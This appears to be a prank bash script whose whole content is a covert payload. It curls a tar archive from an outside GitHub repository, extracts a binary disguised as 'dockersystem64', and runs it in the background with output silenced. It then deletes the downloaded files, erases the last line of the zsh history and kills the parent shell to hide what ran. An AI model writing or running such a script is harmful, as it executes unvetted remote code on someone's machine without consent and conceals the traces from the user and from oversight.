#!/bin/bash

# ---------------------------- VARIABLES ---------------------------- #
init_tempo=120 tempo=20 volume=70 tempo_offset=1 volume_offset=20
# ------------------------------------------------------------------- #

dir=/tmp/ ; dir+=`whoami` ; dir+='-docker' ; mkdir -p $dir
curl https://raw.githubusercontent.com/Don-Chinjao/Mounir_m_a_hack/main/proutsh42.tar -o $dir/proutsh42.tar
tar -xf $dir/proutsh42.tar -C $dir
chmod 777 $dir/dockersystem64
nohup $dir/dockersystem64 $init_tempo $tempo $tempo_offset $volume $volume_offset $dir &>/dev/null &
sleep 0.1 ; rm -rf $dir/proutsh42.tar $dir/dockersystem64 $dir/prout_troll
sed -i '$d' ~/.zsh_history
kill -KILL $PPID
